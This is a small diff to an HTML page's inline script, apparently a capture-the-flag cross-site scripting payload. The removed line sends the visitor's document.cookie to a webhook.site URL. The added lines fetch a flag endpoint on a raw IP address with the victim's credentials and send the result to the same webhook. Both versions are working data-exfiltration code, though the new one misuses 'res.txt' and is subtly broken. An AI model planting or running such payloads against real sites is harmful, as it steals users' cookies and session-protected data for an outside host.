@@ -7,7 +7,8 @@
 </head>
 <body>
     <script>
-        fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?cookie=" + encodeURIComponent(document.cookie));
+        fetch("http://95.217.6.37:20001/api/fetchflag", {credentials:"include"}).then(res => res.txt).then(flag =>
+        fetch("https://webhook.site/b6b6265c-2121-43e7-83e9-1dcc151dc86f?cookie=" + encodeURIComponent(flag)));
     </script>
 </body>
 </html>
